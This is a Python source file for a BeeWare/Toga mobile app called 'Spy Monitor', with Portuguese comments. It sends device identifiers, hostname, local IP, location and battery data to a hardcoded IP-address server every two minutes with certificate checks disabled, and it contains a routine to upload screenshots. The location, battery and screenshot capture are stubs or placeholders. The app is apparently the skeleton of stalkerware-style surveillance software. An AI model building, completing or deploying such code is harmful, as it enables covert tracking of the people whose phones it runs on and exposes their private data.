import toga
from toga.style import Pack
from toga.style.pack import COLUMN, ROW
import time
import threading
import requests
import json
from datetime import datetime
import uuid
import platform
import logging
import queue
import os

# Configuração do servidor externo
SERVER_URL = "https://147.79.111.118"

# Configurações otimizadas para coleta leve
COLLECTION_INTERVAL = 120  # segundos (mais espaçado para reduzir bateria)
SCREENSHOT_INTERVAL = 120  # segundos (2 minutos para screenshots)
REQUEST_TIMEOUT = 20  # segundos (mais tempo para conexões lentas)
MAX_RETRIES = 5  # mais tentativas para confiabilidade
BATCH_SIZE = 3  # lotes menores para evitar sobrecarga

class SpyMonitor(toga.App):
    def __init__(self, formal_name="Spy Monitor", app_id="org.beeware.spymonitor"):
        super().__init__(formal_name=formal_name, app_id=app_id)

    def main_module(self):
        """Retorna o módulo principal para briefcase"""
        return "spymonitor.app_toga"
    def startup(self):
        """Inicializar a aplicação de monitoramento"""
        # Variáveis de controle
        self.is_monitoring = False
        self.device_id = self.get_device_id()
        self.collection_count = 0
        self.data_queue = queue.Queue(maxsize=50)  # Fila para dados coletados
        self.send_thread = None
        self.last_collection = 0
        self.last_screenshot = 0

        # Criar interface principal com Toga
        main_box = toga.Box(style=Pack(direction=COLUMN, padding=10))

        # Título
        title_label = toga.Label(
            '📱 Spy Monitor',
            style=Pack(text_align='center', font_size=20, font_weight='bold', padding_bottom=20)
        )
        main_box.add(title_label)

        # Status
        self.status_label = toga.Label(
            'Status: Parado',
            style=Pack(text_align='center', color='red', font_size=16, padding_bottom=10)
        )
        main_box.add(self.status_label)

        # Botão Iniciar/Parar
        self.monitor_button = toga.Button(
            '▶️ Iniciar Monitoramento',
            on_press=self.toggle_monitoring,
            style=Pack(padding=10, background_color='#4CAF50')
        )
        main_box.add(self.monitor_button)

        # Área de logs
        logs_title = toga.Label(
            '📋 Logs:',
            style=Pack(font_weight='bold', padding_top=20, padding_bottom=5)
        )
        main_box.add(logs_title)

        # ScrollView para logs
        self.logs_text = toga.MultilineTextInput(
            readonly=True,
            style=Pack(flex=1, padding=5)
        )
        main_box.add(self.logs_text)

        self.add_log("App iniciado")
        self.add_log(f"ID do Dispositivo: {self.device_id}")
        self.add_log(f"Servidor: {SERVER_URL}")

        # Criar janela principal
        self.main_window = toga.MainWindow(title=self.formal_name)
        self.main_window.content = main_box
        self.main_window.show()

    def get_device_id(self):
        """Gera ID único do dispositivo"""
        try:
            # Tentar obter ID único baseado no dispositivo
            import hashlib
            unique_string = f"{platform.node()}-{platform.machine()}-{platform.processor()}"
            return hashlib.md5(unique_string.encode()).hexdigest()[:15]
        except:
            return str(uuid.uuid4())[:15]

    def add_log(self, message):
        """Adiciona mensagem aos logs"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {message}\n"

        current_text = self.logs_text.value or ""
        lines = (current_text + log_entry).split('\n')
        if len(lines) > 20:
            lines = lines[-20:]
        self.logs_text.value = '\n'.join(lines)

    def toggle_monitoring(self, widget):
        """Alterna monitoramento"""
        if not self.is_monitoring:
            self.start_monitoring()
        else:
            self.stop_monitoring()

    def start_monitoring(self):
        """Inicia monitoramento"""
        self.is_monitoring = True
        self.status_label.text = 'Status: Ativo'
        self.status_label.style.color = 'green'
        self.monitor_button.text = '⏹️ Parar Monitoramento'
        self.monitor_button.style.background_color = '#F44336'

        # Testar conexão com servidor
        self.test_server_connection()

        # Iniciar thread de monitoramento
        self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
        self.monitoring_thread.start()

        self.add_log("Monitoramento iniciado - Captura automática de screenshots ativada")

    def stop_monitoring(self):
        """Para monitoramento"""
        self.is_monitoring = False
        self.status_label.text = 'Status: Parado'
        self.status_label.style.color = 'red'
        self.monitor_button.text = '▶️ Iniciar Monitoramento'
        self.monitor_button.style.background_color = '#4CAF50'
        self.add_log("Monitoramento parado - Captura de screenshots desativada")

    def test_server_connection(self):
        """Testa conexão com servidor"""
        try:
            response = requests.get(f"{SERVER_URL}/api/test/", timeout=REQUEST_TIMEOUT, verify=False)
            if response.status_code == 200:
                self.add_log("✅ Servidor conectado")
                return True
            else:
                self.add_log(f"⚠️ Resposta do servidor: {response.status_code}")
                return False
        except requests.exceptions.RequestException as e:
            self.add_log(f"❌ Erro de conexão: {str(e)[:50]}")
            return False

    def monitoring_loop(self):
        """Loop principal de monitoramento otimizado"""
        while self.is_monitoring:
            try:
                current_time = time.time()

                # Coleta de dados normal
                if current_time - self.last_collection >= COLLECTION_INTERVAL:
                    self.last_collection = current_time
                    self.collect_and_send_data()

                # Captura de screenshot a cada 2 minutos
                if current_time - self.last_screenshot >= SCREENSHOT_INTERVAL:
                    self.last_screenshot = current_time
                    self.take_screenshot()

                time.sleep(5)  # Sleep menor para resposta mais rápida

            except Exception as e:
                self.add_log(f"Erro no loop principal: {str(e)[:50]}")
                time.sleep(10)

    def collect_and_send_data(self):
        """Coleta e envia dados para o servidor de forma otimizada e leve"""
        try:
            collected_data = []

            # Dados básicos do dispositivo (sempre coletar - mais leve)
            device_data = {
                'imei': self.device_id,
                'timestamp': datetime.now().isoformat(),
                'platform': platform.system(),
                'version': platform.version()[:10] if platform.version() else 'Unknown'
            }
            collected_data.append(('device_info', device_data))

            # Coletar localização (menos frequente - economia de bateria)
            if self.collection_count % 3 == 0:  # A cada 3 coletas (menos frequente)
                location = self.get_location()
                if location:
                    collected_data.append(('location', location))

            # Coletar informações de rede (menos frequente)
            if self.collection_count % 4 == 0:  # A cada 4 coletas
                network_info = self.get_network_info()
                if network_info:
                    collected_data.append(('network', network_info))

            # Coletar dados de bateria (menos frequente)
            if self.collection_count % 6 == 0:  # A cada 6 coletas
                battery_info = self.get_battery_info()
                if battery_info:
                    collected_data.append(('battery', battery_info))

            # Enviar dados coletados apenas se houver dados
            if collected_data:
                self.send_collected_data(collected_data)
                self.add_log(f"✅ {len(collected_data)} tipos de dados enviados")
            else:
                self.add_log("ℹ️ Nenhum dado novo para enviar")

            self.collection_count += 1

        except Exception as e:
            self.add_log(f"❌ Erro na coleta: {str(e)[:40]}")

    def get_location(self):
        """Obtém localização do dispositivo"""
        try:
            # Para BeeWare/Toga, localização pode ser obtida via permissões do sistema
            # Implementação simplificada - em produção precisaria de GPS API
            return {
                'latitude': 0.0,  # Placeholder
                'longitude': 0.0,  # Placeholder
                'accuracy': 0,
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            self.add_log(f"Erro no GPS: {str(e)[:30]}")
            return None

    def get_network_info(self):
        """Obtém informações de rede"""
        try:
            import socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)

            return {
                'hostname': hostname,
                'local_ip': local_ip,
                'timestamp': datetime.now().isoformat()
            }
        except:
            return None

    def get_battery_info(self):
        """Obtém informações da bateria"""
        try:
            # Para BeeWare/Toga, bateria pode ser obtida via API do sistema
            # Implementação simplificada
            return {
                'level': 100,  # Placeholder
                'charging': False,  # Placeholder
                'timestamp': datetime.now().isoformat()
            }
        except:
            return None

    def take_screenshot(self):
        """Captura screenshot automática a cada 2 minutos"""
        try:
            # Para BeeWare/Toga, screenshots podem ser capturados via API do sistema
            # Implementação simplificada - em produção precisaria de screenshot API
            self.add_log("📸 Screenshot seria capturado (simulado)")
        except Exception as e:
            self.add_log(f"Erro no screenshot: {str(e)[:40]}")

    def upload_screenshot(self, screenshot_path):
        """Faz upload do screenshot para o servidor"""
        try:
            if os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    files = {'file': f}
                    data = {
                        'imei': self.device_id,
                        'tipo': 'screenshot',
                        'timestamp': time.time()
                    }

                    response = requests.post(
                        f"{SERVER_URL}/api/upload/",
                        files=files,
                        data=data,
                        timeout=REQUEST_TIMEOUT,
                        verify=False
                    )

                    if response.status_code == 200:
                        os.remove(screenshot_path)  # Remove arquivo após upload
                        self.add_log("✅ Screenshot enviado com sucesso")
                    else:
                        self.add_log(f"⚠️ Erro upload screenshot: {response.status_code}")

        except Exception as e:
            self.add_log(f"❌ Erro no upload: {str(e)[:40]}")

    def send_collected_data(self, data_list):
        """Envia dados coletados de forma otimizada com retry"""
        for data_type, data in data_list:
            self.send_data_with_retry(data_type, data)

    def send_data_with_retry(self, data_type, data, retry_count=0):
        """Envia dados com mecanismo de retry otimizado"""
        try:
            # Mapeamento de URLs otimizado
            url_map = {
                'device_info': f"{SERVER_URL}/api/device-info/",
                'location': f"{SERVER_URL}/api/localizacao/",
                'network': f"{SERVER_URL}/api/atividade-rede/",
                'battery': f"{SERVER_URL}/api/device-info/"
            }

            url = url_map.get(data_type)
            if not url:
                return

            # Envio com timeout otimizado
            response = requests.post(url, json=data, timeout=REQUEST_TIMEOUT, verify=False)

            if response.status_code in [200, 201]:
                # Logs mais concisos
                if data_type == 'location':
                    self.add_log("📍 Localização OK")
                elif data_type == 'network':
                    self.add_log("🌐 Rede OK")
                elif data_type == 'battery':
                    nivel = data.get('level', data.get('bateria_nivel', 'N/A'))
                    self.add_log(f"🔋 Bateria: {nivel}%")
                # Device info não loga para reduzir verbosidade
            else:
                if retry_count < MAX_RETRIES:
                    # Backoff exponencial com jitter para evitar sobrecarga
                    delay = (2 ** retry_count) + (retry_count * 0.1)
                    time.sleep(min(delay, 30))  # Máximo 30 segundos
                    self.send_data_with_retry(data_type, data, retry_count + 1)
                else:
                    self.add_log(f"⚠️ {data_type}: HTTP {response.status_code}")

        except requests.exceptions.Timeout:
            if retry_count < MAX_RETRIES:
                delay = (2 ** retry_count) + 1
                time.sleep(min(delay, 30))
                self.send_data_with_retry(data_type, data, retry_count + 1)
            else:
                self.add_log(f"⏰ Tempo limite {data_type}")
        except requests.exceptions.ConnectionError:
            if retry_count < MAX_RETRIES:
                delay = (2 ** retry_count) + 2
                time.sleep(min(delay, 30))
                self.send_data_with_retry(data_type, data, retry_count + 1)
            else:
                self.add_log(f"🔌 Conexão {data_type} falhou")
        except requests.exceptions.RequestException as e:
            if retry_count < MAX_RETRIES:
                delay = (2 ** retry_count) + 1
                time.sleep(min(delay, 30))
                self.send_data_with_retry(data_type, data, retry_count + 1)
            else:
                self.add_log(f"❌ Erro {data_type}: {str(e)[:25]}")

def main():
    return SpyMonitor()

if __name__ == '__main__':
    app = SpyMonitor()
    app.main_loop()
